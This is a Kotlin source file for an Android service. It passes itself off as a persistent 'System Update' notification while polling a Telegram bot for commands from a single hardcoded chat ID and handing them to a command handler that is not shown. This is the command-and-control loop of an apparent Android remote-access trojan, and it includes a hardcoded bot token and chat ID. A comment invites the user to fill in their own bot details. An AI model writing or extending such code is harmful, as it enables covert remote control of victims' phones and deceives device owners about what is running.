package com.sys.update

import android.app.*
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import kotlinx.coroutines.*
import okhttp3.*
import org.json.JSONObject
import java.util.concurrent.TimeUnit

class BotService : Service() {

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val client = OkHttpClient.Builder()
        .readTimeout(60, TimeUnit.SECONDS)
        .build()

    // Yahan apna token aur chat id daalna
    private val BOT_TOKEN = "7966180213:AAGFqmNDy9b-vNFRAvuBQy6yf3b2U5fIxbI"
    private val CHAT_ID   = "5879359815"
    private var offset = 0L

    override fun onCreate() {
        super.onCreate()
        startForeground(1, buildNotif())
        scope.launch { pollLoop() }
    }

    private fun buildNotif(): Notification {
        val chan = "sys"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val mgr = getSystemService(NotificationManager::class.java)
            if (mgr.getNotificationChannel(chan) == null) {
                mgr.createNotificationChannel(
                    NotificationChannel(chan, "System", NotificationManager.IMPORTANCE_MIN)
                )
            }
        }
        return Notification.Builder(this, chan)
            .setContentTitle("System Update")
            .setContentText("Checking for updates…")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setOngoing(true)
            .build()
    }

    private suspend fun pollLoop() {
        while (scope.isActive) {
            try {
                val url = "https://api.telegram.org/bot$BOT_TOKEN/getUpdates?offset=$offset&timeout=30"
                val body = withContext(Dispatchers.IO) {
                    client.newCall(Request.Builder().url(url).build()).execute()
                        .body?.string() ?: return@withContext null
                } ?: continue

                val arr = JSONObject(body).optJSONArray("result") ?: continue
                for (i in 0 until arr.length()) {
                    val upd = arr.getJSONObject(i)
                    offset = upd.getLong("update_id") + 1
                    val msg = upd.optJSONObject("message") ?: continue
                    val text = msg.optString("text")
                    val chatId = msg.getJSONObject("chat").getLong("id").toString()
                    if (chatId != CHAT_ID) continue
                    CmdHandler.handle(this, text, chatId)
                }
            } catch (e: Exception) {
                delay(5000)
            }
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null
    override fun onDestroy() {
        scope.cancel()
        super.onDestroy()
    }
}
